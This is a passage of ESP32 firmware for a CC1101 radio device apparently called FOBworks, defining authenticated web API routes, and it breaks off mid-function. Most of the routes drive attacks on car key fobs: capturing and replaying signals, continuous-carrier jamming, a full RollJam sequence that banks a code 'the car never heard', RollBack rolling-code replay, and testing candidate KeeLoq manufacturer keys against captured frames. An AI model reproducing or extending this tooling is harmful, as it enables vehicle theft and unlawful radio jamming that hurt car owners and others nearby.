  void    onAuthenticationComplete(esp_ble_auth_cmpl_t cmpl) override {
    if(cmpl.success){
      blePairDone=true; blePairCount++;
      snprintf(blePairLastAddr,18,"%02X:%02X:%02X:%02X:%02X:%02X",
        cmpl.bd_addr[0],cmpl.bd_addr[1],cmpl.bd_addr[2],
        cmpl.bd_addr[3],cmpl.bd_addr[4],cmpl.bd_addr[5]);
      char b[60]; snprintf(b,60,"[BLE] Bonded: %s",blePairLastAddr); addLog(b);
    } else { addLog("[BLE] Pairing failed — device rejected or timed out"); }
  }
#endif
};
static BleSecCb* bleSecCbInst=nullptr;

// All API handlers pass through this single bearer-token gate. Root remains
// public so captive-portal discovery can load the dashboard and ask for the
// separate per-device access code.
static bool requestTokenMatches(){
  if(!deviceCredentialsReady||!srv.hasHeader("Authorization")) return false;
  String header=srv.header("Authorization");
  static const char PREFIX[]="Bearer ";
  if(!header.startsWith(PREFIX)) return false;
  String supplied=header.substring(sizeof(PREFIX)-1);
  return constantTimeDeviceTokenMatches(supplied);
}

static bool requireRequestAuth(){
  if(requestTokenMatches()) return true;
  srv.sendHeader("Cache-Control","no-store");
  srv.sendHeader("WWW-Authenticate","Bearer realm=\"FOBworks\"");
  srv.send(401,"application/json","{\"ok\":false,\"error\":\"unauthorized\"}");
  return false;
}

// Concrete std::function types. A template here makes the Arduino builder
// emit a prototype that names the template parameter before it exists.
static void protectedRoute(const char* uri,WebServer::THandlerFunction handler){
  srv.on(uri,[handler](){if(requireRequestAuth()) handler();});
}

static void protectedRoute(const char* uri,HTTPMethod method,WebServer::THandlerFunction handler){
  srv.on(uri,method,[handler](){if(requireRequestAuth()) handler();});
}

static void protectedRoute(const char* uri,HTTPMethod method,WebServer::THandlerFunction handler,WebServer::THandlerFunction bodyHandler){
  srv.on(uri,method,[handler](){if(requireRequestAuth()) handler();},bodyHandler);
}

// WebServer normally buffers a plain POST body before invoking its handler.
// Registering a raw-body callback makes core 3.x deliver bounded HTTP_RAW_BUFLEN
// chunks instead. 8 KiB is more than enough for the 512 pulses replayRaw()
// accepts, including a short text header and maximum-width signed pulse values.
// Raised from 8192 in research/23 §4 step 1's round: measured, the corpus's first
// trimmable frame sits at pulse 2517, and at 4.38 bytes/pulse that needs ~11 KB of body.
// 8192 bytes reached only 1868 pulses — the pulse cap could have been raised to 1868 (as
// instructed) and the import would STILL have refused the corpus head, because the body
// limit stopped short of the frame. 16384 carries ~3741 pulses, past 2517 with margin.
static constexpr size_t SUB_REPLAY_MAX_BODY_BYTES=16384;
static String subReplayBody;
static bool subReplayBodyStarted=false;
static bool subReplayBodyAuthorized=false;
static bool subReplayBodyTooLarge=false;
static bool subReplayBodyAborted=false;

static void resetSubReplayBody(){
  subReplayBody.remove(0);
  subReplayBodyStarted=false;
  subReplayBodyAuthorized=false;
  subReplayBodyTooLarge=false;
  subReplayBodyAborted=false;
}

static bool isMultipartRequest(){
  return srv.hasHeader("Content-Type")&&srv.header("Content-Type").startsWith("multipart/");
}

static void receiveSubReplayBody(){
  // Multipart requests use the same callback slot for HTTPUpload. Never call
  // srv.raw() in that context; the endpoint accepts only a plain .sub body.
  if(isMultipartRequest()) return;

  HTTPRaw& raw=srv.raw();
  if(raw.status==RAW_START){
    resetSubReplayBody();
    subReplayBodyStarted=true;
    subReplayBodyAuthorized=requestTokenMatches();
    int contentLength=srv.clientContentLength();
    subReplayBodyTooLarge=contentLength<0||(size_t)contentLength>SUB_REPLAY_MAX_BODY_BYTES;
    if(subReplayBodyAuthorized&&!subReplayBodyTooLarge&&contentLength>0)
      subReplayBodyAborted=!subReplayBody.reserve((size_t)contentLength);
    return;
  }
  if(raw.status==RAW_ABORTED){
    subReplayBodyAborted=true;
    subReplayBody.remove(0);
    return;
  }
  if(raw.status!=RAW_WRITE||!subReplayBodyStarted||!subReplayBodyAuthorized||
     subReplayBodyTooLarge||subReplayBodyAborted) return;
  if(raw.currentSize>SUB_REPLAY_MAX_BODY_BYTES-subReplayBody.length()){
    subReplayBodyTooLarge=true;
    subReplayBody.remove(0);
    return;
  }
  if(!subReplayBody.concat((const char*)raw.buf,(unsigned int)raw.currentSize)){
    subReplayBodyAborted=true;
    subReplayBody.remove(0);
  }
}

static bool parseSubReplayBody(const String& body,float& mhz,uint16_t* pulses,int& pulseCount){
  mhz=433.92f;
  pulseCount=0;

  int fi=body.indexOf("Frequency:");
  if(fi>=0){
    size_t pos=(size_t)fi+10;
    while(pos<body.length()&&(body[pos]==' '||body[pos]=='\t')) pos++;
    uint32_t hz=0;
    bool haveHz=false;
    while(pos<body.length()&&isDigit(body[pos])){
      haveHz=true;
      uint8_t digit=(uint8_t)(body[pos++]-'0');
      hz=hz>99999999u?999999999u:hz*10u+digit;
    }
    if(haveHz&&hz>100000000u) mhz=(float)hz/1000000.0f;
  }

  int ri=body.indexOf("RAW_Data:");
  if(ri<0) return false;
  size_t pos=(size_t)ri+9;
  // research/23 §2.1: search the WHOLE body for a frame, not just the first line.
  //
  // Two limits had to move together. The pulse cap was 512, and the scan also stopped at
  // the first CR/LF — so only the first RAW_Data line was ever read. A corpus .sub has 512
  // pulses per line and 133 lines, and the frame is not at the start: measured, the file's
  // first 2048 pulses contain NO trimmable frame (the first block that does puts it at
  // index 469). So the documented path -- POST a .sub body -- refused the very corpus it
  // was written to consume, unless the caller hand-cropped the body to a burst head.
  //
  // Now whitespace (including newlines) is skipped and the scan continues across lines, so
  // the body's full 8192 bytes reach the trim. At 4.38 bytes/pulse that is ~1869 pulses
  // (verified against the corpus: 297934 bytes / 67977 pulses). The trim already searches
  // for a pitch pair, so it needs no new logic -- only enough pulses to find one.
  //
  // 1868 is the body limit expressed in pulses (8192 / 4.38), rounded down; pulses is
  // sized to match by the callers.
  while(pos<body.length()&&pulseCount<SUB_REPLAY_MAX_PULSES){
    // Skip any whitespace, including line breaks, so the parse continues past the first
    // line instead of terminating at it.
    while(pos<body.length()&&(body[pos]==' '||body[pos]=='\t'||body[pos]=='\r'||body[pos]=='\n')) pos++;
    if(pos>=body.length()) break;
    if(body[pos]=='-'||body[pos]=='+') pos++;
    size_t start=pos;
    uint32_t value=0;
    while(pos<body.length()&&isDigit(body[pos])){
      uint8_t digit=(uint8_t)(body[pos++]-'0');
      value=value>6553u?65535u:min(value*10u+digit,(uint32_t)65535u);
    }
    if(pos==start){
      // No digits here and not whitespace. Two cases matter:
      //   1. a repeated "RAW_Data:" label — corpus .sub files put one on EVERY line, so
      //      this is the common case, not an error. Skip past the label and keep parsing,
      //      otherwise every line after the first is discarded and the search window
      //      silently stays at 512 pulses (measured: the corpus's frames are past that).
      //   2. any other non-numeric token — skip the rest of the line.
      size_t before=pos;
      while(pos<body.length()&&body[pos]!='\r'&&body[pos]!='\n'){
        if(body.startsWith("RAW_Data:",pos)){ pos+=9; break; }
        pos++;
      }
      if(pos==before) break;          // nothing consumed: avoid an infinite loop
      continue;
    }
    pulses[pulseCount++]=(uint16_t)value;
  }
  return true;
}

void setupRoutes(){
  const char* authHeaders[]={"Authorization","Content-Type"};
  srv.collectHeaders(authHeaders,2);

  srv.on("/",[](){
    srv.sendHeader("Connection","close");   // prevent Safari keep-alive deadlock on sync WebServer
    srv.sendHeader("Cache-Control","no-store");
    srv.send_P(200,"text/html",MAIN_PAGE);
  });

  protectedRoute("/api/status",[](){
    int ku=0; for(int i=0;i<MAX_KEYS;i++) if(keys[i].used) ku++;
    stackSample();
    String j="{\"stack_hwm\":"+String(stackHwmMinBytes==0xFFFFFFFFu?0:stackHwmMinBytes)+
             ",\"stack_hwm_after_decode\":"+String(stackHwmAfterDecode)+
             ",\"reset_reason\":\""+resetReasonStr+"\","+
             "\"heap_free\":"+String(ESP.getFreeHeap())+
             ",\"heap_max_alloc\":"+String(ESP.getMaxAllocHeap())+
             ",\"heap_min\":"+String(ESP.getMinFreeHeap())+","+
             "\"freq\":"+String(curFreq,2)+",\"batt_v\":"+String(battV,3)+
             ",\"batt_pct\":"+String(battPct,1)+",\"scan\":"+String(scanActive?"true":"false")+
             ",\"uptime\":"+String(millis())+",\"cc1101\":"+String(cc1101OK?"true":"false")+
             ",\"cc1101_ver\":\"0x"+String(cc1101Version,HEX)+"\""+
             ",\"sd\":"+String(sdMounted?"true":"false")+
             ",\"licensed\":true"+
             ",\"fsk_mode\":"+String(fskCapMode?"true":"false")+
             ",\"sweep_min\":"+String(sweepMin,2)+
             ",\"sweep_max\":"+String(sweepMax,2)+
             ",\"cap_range_min\":"+String(capRangeMin,2)+
             ",\"cap_range_max\":"+String(capRangeMax,2)+
             ",\"sticky_mhz\":"+String(stickyFreq,2)+
             ",\"sticky_prio\":"+String(stickyPrio)+
             ",\"keys_used\":"+String(ku)+
             ",\"ch_b_ready\":"+String(rfLenB>0?"true":"false")+
             ",\"ch_b_mhz\":"+String(rfFreqB,2)+
             ",\"squelch_dbm\":"+String(autoCapDbm)+
             ",\"cap_mode\":\""+String(lastCapGdo0?"gdo0":"rssi")+
             "\",\"jam_active\":"+String(jamActive?"true":"false")+
             ",\"jam_freq\":"+String(jamFreq,2)+
             ",\"kl_selftest\":"+String(klSelfTestOK?"true":"false")+
             ",\"kl_selftest_pass\":"+String(klSelfTestPass)+
             ",\"kl_deriv_ok\":"+String(klDerivOK?"true":"false")+
             ",\"kl_deriv_pass\":"+String(klDerivPass)+
             ",\"kl_parse_ok\":"+String(klParseOK?"true":"false")+
             ",\"kia_v34_ok\":"+String(kiaV34SelfTestOK?"true":"false")+"}";
    srv.send(200,"application/json",j);
  });

  protectedRoute("/api/library",[](){
    if(srv.hasArg("clear")){
      sdClearLibrary();
      srv.send(200,"application/json","{\"ok\":true,\"cleared\":true}");
      return;
    }
    String lines[80];
    int count=0;
    if(sdMounted){
      digitalWrite(PIN_CC1101_CS,HIGH);
      digitalWrite(PIN_LORA_CS,HIGH);
      File idx=SD.open("/fobworks/library.txt",FILE_READ);
      if(idx){
        while(idx.available()){
          String line=idx.readStringUntil('\n');
          line.trim();
          if(line.indexOf('\t')<0) continue;
          lines[count%80]=line;
          count++;
        }
        idx.close();
      }
    }
    String j="{\"ok\":true,\"sd\":";
    j+=sdMounted?"true":"false";
    j+=",\"signals\":[";
    int start=count>80?count-80:0;
    for(int i=start;i<count;i++){
      String line=lines[i%80];
      int t1=line.indexOf('\t');
      int t2=line.indexOf('\t',t1+1);
      int t3=line.indexOf('\t',t2+1);
      if(t1<0||t2<0||t3<0) continue;
      String file=line.substring(0,t1);
      String proto=line.substring(t1+1,t2);
      String serial=line.substring(t2+1,t3);
      String mhz=line.substring(t3+1);
      proto.replace("\\","\\\\");
      proto.replace("\"","\\\"");
      if(i>start) j+=",";
      j+="{\"file\":\""+file+"\",\"proto\":\""+proto+"\",\"sn\":\""+serial+"\",\"freq\":"+mhz+"}";
    }
    j+="]}";
    srv.send(200,"application/json",j);
  });

  protectedRoute("/api/scan",[](){
    srv.send(200,"application/json",scanStatsJson());
  });

  protectedRoute("/api/scan_toggle",[](){
    scanActive=!scanActive;
    scanUserPaused=!scanActive; // track explicit user intent
    if(scanActive){stickyFreq=0.0f;stickyPrio=0;} // reset linger on explicit restart
    srv.send(200,"application/json",String("{\"active\":")+String(scanActive?"true":"false")+"}");
  });

  // /api/sweep_range?f_min=311&f_max=316  — limit background sweep to a MHz band
  // /api/sweep_range?reset=1              — restore full-band sweep
  protectedRoute("/api/sweep_range",[](){
    if(srv.hasArg("reset")){
      sweepMin=0.0f; sweepMax=9999.0f;
    } else {
      if(srv.hasArg("f_min")){float v=srv.arg("f_min").toFloat();if(v>=100&&v<=950)sweepMin=v;}
      if(srv.hasArg("f_max")){float v=srv.arg("f_max").toFloat();if(v>=100&&v<=950)sweepMax=v;}
    }
    swp_save(); // persist so reboot restores the same band
    srv.send(200,"application/json",
      "{\"ok\":true,\"sweep_min\":"+String(sweepMin,2)+",\"sweep_max\":"+String(sweepMax,2)+"}");
  });

  // /api/cap_range?f_min=311&f_max=316  — limit capture sweep to a MHz band
  // /api/cap_range?reset=1              — restore full-band capture sweep
  protectedRoute("/api/cap_range",[](){
    if(srv.hasArg("reset")){ capRangeMin=0.0f; capRangeMax=9999.0f; }
    else {
      if(srv.hasArg("f_min")){float v=srv.arg("f_min").toFloat();if(v>=100&&v<=950)capRangeMin=v;}
      if(srv.hasArg("f_max")){float v=srv.arg("f_max").toFloat();if(v>=100&&v<=950)capRangeMax=v;}
    }
    swp_save(); // persist alongside sweep range so FOBclone/FOBcatch arm survives reboots
    srv.send(200,"application/json",
      "{\"ok\":true,\"cap_range_min\":"+String(capRangeMin,2)+",\"cap_range_max\":"+String(capRangeMax,2)+"}");
  });

  // Non-blocking capture: set flag, return immediately, main loop runs the capture.
  // Avoids re-entrant srv.handleClient() inside the capture loop which closes
  // the TCP connection before srv.send() can deliver the response.
  protectedRoute("/api/capture_start",[](){
    if(jamActive){srv.send(200,"application/json","{\"status\":\"jam-active\",\"hint\":\"Stop jamming before capturing\"}");return;}
    if(captureInProgress){srv.send(200,"application/json","{\"status\":\"busy\"}");return;}
    // Optional frequency override: ?f=433.92
    if(srv.hasArg("f")){
      float ff=srv.arg("f").toFloat();
      if(ff>=200&&ff<=950){ curFreq=ff;
        SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
        cc_setFreq(curFreq); cc_strobe(0x34);
        SPI.endTransaction();
      }
    }
    // Optional capture range: ?f_min=311&f_max=316 — limits the sweep fallback
    if(srv.hasArg("f_min")){float v=srv.arg("f_min").toFloat();if(v>=100&&v<=950)capRangeMin=v;}
    if(srv.hasArg("f_max")){float v=srv.arg("f_max").toFloat();if(v>=100&&v<=950)capRangeMax=v;}
    // If range set but no specific freq, tune to first in-range frequency
    if(capRangeMin>0&&!srv.hasArg("f")){
      for(int i=0;i<N_FREQS;i++){
        if(FOB_FREQS[i]>=capRangeMin&&FOB_FREQS[i]<=capRangeMax){
          curFreq=FOB_FREQS[i];
          SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
          cc_setFreq(curFreq); cc_strobe(0x34);
          SPI.endTransaction();
          break;
        }
      }
    }
    // Optional timeout override: ?t=30000 (ms, capped 1000–60000)
    if(srv.hasArg("t")){
      int tt=srv.arg("t").toInt();
      capTimeoutOverride=(tt>=1000&&tt<=60000)?(uint16_t)tt:CAP_TIMEOUT_MS;
    } else { capTimeoutOverride=CAP_TIMEOUT_MS; }
    captureRequested=true; captureResultReady=false;
    lastDecode="{\"status\":\"capturing\"}";
    srv.send(200,"application/json","{\"status\":\"started\"}");
  });

  protectedRoute("/api/capture_poll",[](){
    // captureRequested=true means the main loop hasn't started yet — still "capturing" from client's view
    if(captureInProgress||captureRequested){srv.send(200,"application/json","{\"status\":\"capturing\"}");return;}
    // Auto-scan queue: pop oldest result so rapid captures are delivered in order, never dropped
    String qd; if(sigQPop(qd)){srv.send(200,"application/json",qd);return;}
    if(captureResultReady){captureResultReady=false;srv.send(200,"application/json",lastDecode);return;}
    srv.send(200,"application/json","{\"status\":\"idle\"}");
  });

  // Legacy blocking route (kept for USB-serial companion dashboard compatibility)
  protectedRoute("/api/capture_decode",[](){
    bool ok=captureSignal(CAP_TIMEOUT_MS);
    if(ok) decodeSignal();
    else lastDecode="{\"error\":\"capture-failed\",\"edges\":0}";
    srv.send(200,"application/json",lastDecode);
  });

  protectedRoute("/api/decode",[](){
    srv.send(200,"application/json",lastDecode.length()>2?lastDecode:String("{\"error\":\"no-data\"}"));
  });

  protectedRoute("/api/replay",[](){
    bool ok=replayRaw(rfFreq, rfBuf, rfLen, 3, rfStartHigh);
    srv.send(200,"application/json",String("{\"ok\":")+( ok?"true":"false")+"}");
  });

  // /api/jam_start?freq=315.00  — begin continuous-carrier jam on target frequency.
  // Stops scan sweep; holds CC1101 in TX mode with GDO0 HIGH (OOK carrier).
  // The car cannot receive fob presses while jamming; captures are valid for replay.
  protectedRoute("/api/jam_start",[](){
    if(captureInProgress||captureRequested){
      srv.send(200,"application/json","{\"ok\":false,\"error\":\"capture-busy\"}"); return;
    }
    float f=srv.hasArg("freq")?srv.arg("freq").toFloat():rfFreq;
    if(f<100.0f||f>950.0f){
      srv.send(200,"application/json","{\"ok\":false,\"error\":\"bad-freq\"}"); return;
    }
    startJam(f);
    srv.send(200,"application/json",
      String("{\"ok\":true,\"jam\":true,\"freq\":")+String(jamFreq,2)+"}");
  });

  // /api/jam_stop  — halt continuous-carrier jam, restore CC1101 to RX/scan mode.
  protectedRoute("/api/jam_stop",[](){
    stopJam();
    srv.send(200,"application/json","{\"ok\":true,\"jam\":false}");
  });

  protectedRoute("/api/replay_predicted",[](){
    srv.send(200,"application/json",replayPredicted());
  });

  // ── FOBback (RollBack) routes ─────────────────────────────────────────────
  protectedRoute("/api/fbk_arm",[](){
    fbkArmed=true; fbkCount=0;
    srv.send(200,"application/json","{\"ok\":true,\"armed\":true}");
  });
  protectedRoute("/api/fbk_disarm",[](){
    fbkArmed=false; fbkCount=0;
    srv.send(200,"application/json","{\"ok\":true,\"armed\":false}");
  });

  // ── C2 RollBack routes ───────────────────────────────────────────────────────
  // POST-less by design: both are explicit user actions, and firing is separate
  // from arming so a double tap cannot re-fire the sequence.
  //
  // /api/rollback_arm — arm the sequencer. Requires >=2 captured codes.
  protectedRoute("/api/rollback_arm",[](){
    bool ok=rbArm();
    // A refusal must be diagnosable rather than silent: "nothing happened" is the
    // worst feedback for a feature whose failure mode is otherwise invisible
    // (research/10 2.4). The reason names which check failed.
    String reason="";
    if(!ok){
      if(fbkCount<2)                              reason="need-2-codes";
      else if(!fbkBuf[0].trimmed||!fbkBuf[1].trimmed) reason="untrimmed-block";
      else if(fbkCtrOrder()<0)                    reason="same-or-backward-code";
      else                                        reason="no-distinct-codes";
    }
    String hint = ok ? String("") :
      (reason=="need-2-codes"
        ? String("Need at least 2 captured codes - press the fob twice while FOBback is armed")
        : (reason=="untrimmed-block"
            ? String("These captures could not be reduced to a single frame, so the stored block holds several repeats. RollBack is only correct for protocols with a known frame boundary (Kia V3/V4 today).")
            : String("Both captures carry the same counter, or are out of order. Press the fob again so a new counter is captured.")));
    srv.send(200,"application/json",
      String("{\"ok\":")+(ok?"true":"false")+
      ",\"armed\":"+(rbArmed?"true":"false")+
      ",\"codes\":"+String(fbkCount)+
      ",\"reason\":\""+reason+"\""+
      ",\"hint\":\""+hint+"\"}");
  });

  // ── C1 RollJam routes ────────────────────────────────────────────────────────
  // Arm and start are separate, as with RollBack: starting consumes the arm, so a
  // duplicate tap cannot re-fire. The sequence is then driven by rjTick() in
  // loop(), NOT by the browser, so closing the tab cannot strand the jam.
  //
  // /api/rolljam_arm?freq=315.00&offset_khz=150
  protectedRoute("/api/rolljam_arm",[](){
    float f=srv.hasArg("freq")?srv.arg("freq").toFloat():curFreq;
    float off=srv.hasArg("offset_khz")?srv.arg("offset_khz").toFloat():150.0f;
    bool ok=rjArm(f,off);
    String reason = ok ? "" : (rjState!=RJ_IDLE ? "sequence-running" : "bad-freq");
    srv.send(200,"application/json",
      String("{\"ok\":")+(ok?"true":"false")+
      ",\"armed\":"+(rjArmed?"true":"false")+
      ",\"freq\":"+String(rjFreq,3)+
      ",\"offset_khz\":"+String(rjJamOffset*1000.0f,0)+
      ",\"reason\":\""+reason+"\"}");
  });

  // /api/rolljam_start — begin the armed sequence (jam, capture 1, jam, capture 2,
  // replay 1). Single-shot.
  protectedRoute("/api/rolljam_start",[](){
    bool ok=rjStart();
    srv.send(200,"application/json",
      String("{\"ok\":")+(ok?"true":"false")+
      ",\"state\":\""+String(rjState==RJ_JAM1?"jam1":"idle")+"\""+
      ",\"freq\":"+String(rjFreq,3)+"}");
  });

  // /api/rolljam_abort — stop the sequence and the carrier immediately.
  protectedRoute("/api/rolljam_abort",[](){
    if(jamActive) stopJam();
    setLed(0,150,65);
    rjLastJson="{\"event\":\"rolljam\",\"state\":\"aborted\",\"reason\":\"user\"}";
    serialEmit(rjLastJson);
    rjReset();
    srv.send(200,"application/json","{\"ok\":true,\"state\":\"idle\"}");
  });

  // /api/rolljam_status — phase, whether the jam is live, and what is held.
  protectedRoute("/api/rolljam_status",[](){
    const char* ph = rjState==RJ_IDLE ? "idle" :
                     rjState==RJ_JAM1 ? "jam1" :
                     rjState==RJ_CAP1 ? "cap1" :
                     rjState==RJ_JAM2 ? "jam2" :
                     rjState==RJ_CAP2 ? "cap2" :
                     rjState==RJ_TX1  ? "tx" : "done";
    srv.send(200,"application/json",
      String("{\"phase\":\"")+ph+"\""+
      ",\"armed\":"+(rjArmed?"true":"false")+
      ",\"jam_active\":"+(jamActive?"true":"false")+
      ",\"replayed\":"+(rjReplayed?"true":"false")+
      ",\"len1\":"+String(rjLen1)+
      ",\"len2\":"+String(rjLen2)+
      ",\"has_ctr1\":"+(rjHasCtr1?"true":"false")+
      ",\"has_ctr2\":"+(rjHasCtr2?"true":"false")+
      ",\"trim1\":"+(rjTrim1?"true":"false")+
      ",\"trim2\":"+(rjTrim2?"true":"false")+
      ",\"last\":"+rjLastJson+"}");
  });

  // /api/rolljam_replay — retransmit the banked code 2 (the one the car never heard).
  protectedRoute("/api/rolljam_replay",[](){
    if(rjLen2<8){
      srv.send(200,"application/json","{\"ok\":false,\"error\":\"no-held-code\"}");
      return;
    }
    bool ok=replayRaw(rjFreq, rjBuf2, rjLen2, 3, rjSh2);
    srv.send(200,"application/json",
      String("{\"ok\":")+(ok?"true":"false")+
      ",\"freq\":"+String(rjFreq,3)+",\"len\":"+String(rjLen2)+"}");
  });

  // /api/rollback_fire?gap_ms=120 — transmit code 1, wait, transmit code 2.
  protectedRoute("/api/rollback_fire",[](){
    uint32_t g=srv.hasArg("gap_ms")?(uint32_t)srv.arg("gap_ms").toInt():rbGapMs;
    bool ok=rbStart(g);
    srv.send(200,"application/json",
      String("{\"ok\":")+(ok?"true":"false")+
      ",\"state\":\""+(ok?"sent1":"not-fired")+"\",\"gap_ms\":"+String(rbGapMs)+
      ",\"codes\":"+String(fbkCount)+"}");
  });

  // /api/rollback_status — current phase, captures held, last result.
  protectedRoute("/api/rollback_status",[](){
    const char* ph = (rbPhase==RB_GAP)?"gap":((rbPhase==RB_DONE)?"done":"idle");
    srv.send(200,"application/json",
      String("{\"phase\":\"")+ph+"\",\"armed\":"+(rbArmed?"true":"false")+
      ",\"codes\":"+String(fbkCount)+
      ",\"gap_ms\":"+String(rbGapMs)+
      ",\"last\":"+rbLastJson+"}");
  });
  protectedRoute("/api/fbk_status",[](){
    String j="{\"armed\":"+String(fbkArmed?"true":"false")+",\"n\":"+String(fbkCount)+",\"sigs\":[";
    for(int i=0;i<fbkCount;i++){
      if(i>0) j+=",";
      j+="{\"idx\":"+String(i)+",\"freq\":"+String(fbkBuf[i].freq,2)+
         ",\"ts\":"+String(fbkBuf[i].ts)+",\"len\":"+String(fbkBuf[i].len)+
         // Surface the trim state here, not only at arm time: whether a capture is
         // one frame or several decides whether C1/C2 are correct at all, and it is
         // the same reason the arm gate reports "untrimmed-block" (research/12 §3 P1).
         ",\"trimmed\":"+(fbkBuf[i].trimmed?"true":"false")+"}";
    }
    j+="]}";
    srv.send(200,"application/json",j);
  });
  protectedRoute("/api/fbk_replay",[](){
    int n=srv.hasArg("n")?srv.arg("n").toInt():0;
    if(n<0||n>=fbkCount){
      srv.send(200,"application/json",
        "{\"ok\":false,\"error\":\"idx-out-of-range\",\"count\":"+String(fbkCount)+"}");
      return;
    }
    if(srv.hasArg("gap_ms")){
      int g=srv.arg("gap_ms").toInt(); if(g>0&&g<=3000) delay(g);
    }
    bool ok=replayRaw(fbkBuf[n].freq, fbkBuf[n].w, fbkBuf[n].len, 3, fbkBuf[n].sh);
    srv.send(200,"application/json",
      String("{\"ok\":")+( ok?"true":"false")+
      ",\"idx\":"+String(n)+",\"freq\":"+String(fbkBuf[n].freq,2)+"}");
  });

  protectedRoute("/api/dual_band_replay",[](){
    // Retransmit Ch A (rfBuf) then Ch B (rfBufB) with a fast frequency hop between them.
    // ch_a_mhz / ch_b_mhz query params override the stored frequencies if provided.
    float chaMhz=srv.hasArg("ch_a_mhz")?srv.arg("ch_a_mhz").toFloat():rfFreq;
    float chbMhz=srv.hasArg("ch_b_mhz")?srv.arg("ch_b_mhz").toFloat():rfFreqB;
    int reps=srv.hasArg("reps")?srv.arg("reps").toInt():3; reps=max(1,min(reps,5));
    bool wasScan=scanActive; scanActive=false;
    bool chaOk=false,chbOk=false;
    if(rfLen>0){  chaOk=replayRaw(chaMhz, rfBuf, rfLen, reps, rfStartHigh);  delay(5); }
    if(rfLenB>0){ chbOk=replayRaw(chbMhz, rfBufB, rfLenB, reps, rfStartHighB); }
    scanActive=wasScan;
    srv.send(200,"application/json",
      String("{\"ok\":")+((chaOk||chbOk)?"true":"false")+
      ",\"ch_a_ok\":"+String(chaOk?"true":"false")+
      ",\"ch_a_mhz\":"+String(chaMhz,2)+
      ",\"ch_b_ok\":"+String(chbOk?"true":"false")+
      ",\"ch_b_mhz\":"+String(rfLenB>0?chbMhz:0.0f,2)+
      ",\"ch_b_ready\":"+String(rfLenB>0?"true":"false")+"}");
  });

  protectedRoute("/api/lib_replay",[](){
    String proto=srv.arg("proto");
    uint32_t sn=(uint32_t)srv.arg("sn").toInt();
    int32_t  ctr=(int32_t)srv.arg("ctr").toInt();
    int32_t  delta=(int32_t)srv.arg("delta").toInt(); if(delta==0) delta=1;
    float    mhz=srv.arg("mhz").toFloat(); if(mhz<100||mhz>950) mhz=433.92f;
    int      te=srv.arg("te").toInt();
    uint8_t  ctrl=(uint8_t)srv.arg("ctrl").toInt();
    srv.send(200,"application/json",replayLibEntry(proto,sn,ctr,delta,mhz,te,ctrl));
  });

  protectedRoute("/api/save_decoded",[](){
    String n=srv.arg("n"); if(n.length()==0) n=autoName();
    int s=keySave(n,rfFreq,rfBuf,rfLen,rfStartHigh);
    srv.send(200,"application/json","{\"ok\":"+(s>=0?String("true"):String("false"))+",\"slot\":"+String(s)+",\"name\":\""+n+"\"}");
  });

  protectedRoute("/api/keys",[](){
    srv.send(200,"application/json",keysJson());
  });

  protectedRoute("/api/play_key",[](){
    int i=srv.arg("i").toInt();
    if(i<0||i>=MAX_KEYS||!keys[i].used){srv.send(200,"application/json","{\"ok\":false}");return;}
    bool ok=replayRaw(keys[i].freq, keys[i].data, keys[i].len, 3, keys[i].sh);
    srv.send(200,"application/json",String("{\"ok\":")+( ok?"true":"false")+"}");
  });

  protectedRoute("/api/del_key",[](){
    int i=srv.arg("i").toInt();
    if(i>=0&&i<MAX_KEYS) keys[i].used=false;
    srv.send(200,"application/json","{\"ok\":true}");
  });

  // /api/setfreq?f=<MHz> — jump CC1101 to a specific channel and pin the sweep
  // range to ±0.15 MHz so scanTick() stays there for the session (v3.50).
  protectedRoute("/api/setfreq",[](){
    float f=srv.arg("f").toFloat();
    if(f>200&&f<950){
      curFreq=f;
      sweepMin=f-0.15f; sweepMax=f+0.15f;
      swp_save();
      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
      cc_setFreq(f); cc_strobe(0x34);
      SPI.endTransaction();
    }
    srv.send(200,"application/json","{\"freq\":"+String(curFreq,2)+
      ",\"sweep_min\":"+String(sweepMin,2)+",\"sweep_max\":"+String(sweepMax,2)+"}");
  });

  protectedRoute("/api/squelch",[](){
    String dbmStr=srv.arg("dbm");
    if(dbmStr.length()){
      int dbm=dbmStr.toInt();
      if(dbm>-40) dbm=-40;
      if(dbm<-90) dbm=-90;
      autoCapDbm=dbm;
    }
    srv.send(200,"application/json",String("{\"ok\":true,\"dbm\":")+autoCapDbm+"}");
  });

  protectedRoute("/api/reinit",[](){
    scanActive=false; delay(50);
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    bool ok=cc_init(curFreq);
    SPI.endTransaction();
    srv.send(200,"application/json",String("{\"ok\":")+String(ok?"true":"false")+"}");
  });
  // /api/mfr_test?key=<16hex>[&hop=<8hex>&sn=<decimal>]
  // Test a candidate 64-bit manufacturer key against the last captured KeeLoq frame
  // (or against explicitly supplied hop+sn params). Returns a match result for the
  // simple form plus every mode in ks_deriveOneMfrKey(), so the answer uses exactly
  // the derivations the decoder itself searches — no more, no less.
  protectedRoute("/api/mfr_test",[](){
    String kh=srv.arg("key");
    uint64_t mfrKey=0;
    if(!ks_parseHex64(kh.c_str(),mfrKey)){
      srv.send(200,"application/json","{\"ok\":false,\"error\":\"bad-key\",\"hint\":\"Supply 8-16 hex chars, e.g. key=00005351E24B21EF\"}");
      return;
    }
    // Resolve frame: prefer supplied hop+sn, fall back to last KeeLoq history entry
    uint32_t hop=0,sn32=0; bool gotFrame=false;
    if(srv.hasArg("hop")&&srv.hasArg("sn")){
      uint64_t tmp=0;
      if(ks_parseHex64(srv.arg("hop").c_str(),tmp)) hop=(uint32_t)tmp;
      sn32=(uint32_t)srv.arg("sn").toInt(); gotFrame=true;
    } else {
      for(int i=(int)histC-1;i>=0&&!gotFrame;i--){
        int idx=(histI-1-i+HIST_SZ)%HIST_SZ;
        if(hist[idx].proto==0){ sn32=hist[idx].sn; hop=hist[idx].hop; gotFrame=true; }
      }
    }
    if(!gotFrame){
      srv.send(200,"application/json","{\"ok\":false,\"error\":\"no-frame\",\"hint\":\"Capture a KeeLoq signal first, or pass &hop=<hex>&sn=<decimal>\"}");
      return;
    }
    char kout[20]; snprintf(kout,20,"%08lX%08lX",(unsigned long)(mfrKey>>32),(unsigned long)(mfrKey&0xFFFFFFFFUL));
    String out="{\"ok\":true,\"key\":\""+String(kout)+"\",\"sn\":"+String((unsigned long)sn32)+",\"any_match\":false,\"results\":[";
    bool anyMatch=false;
    // Simple learning first: device key == manufacturer key.
    {
      uint32_t dec=ks_klDecrypt(hop,mfrKey);
      bool m=ks_klSnMatch(dec,sn32);
